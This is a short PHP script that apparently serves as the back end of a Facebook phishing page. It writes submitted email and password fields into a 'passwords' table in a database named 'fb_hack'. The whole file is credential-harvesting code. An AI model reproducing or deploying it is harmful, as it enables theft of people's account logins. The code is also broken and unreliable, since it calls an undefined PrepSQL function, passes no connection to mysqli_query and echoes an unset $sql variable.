<?php

print_r($_POST);

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "fb_hack";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if ($conn) {
    echo "Connection ON";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// insert into database

if ($_POST['submit'] === "submit") {
    $email = $_POST['email'];
    $password = $_POST['pass'];

    $sql = "INSERT INTO passwords (UserName, Password) VALUES (" . PrepSQL($email) . ", " . PrepSQL($password) . ")";

    mysqli_query($sql);
}


$conn->close();
?>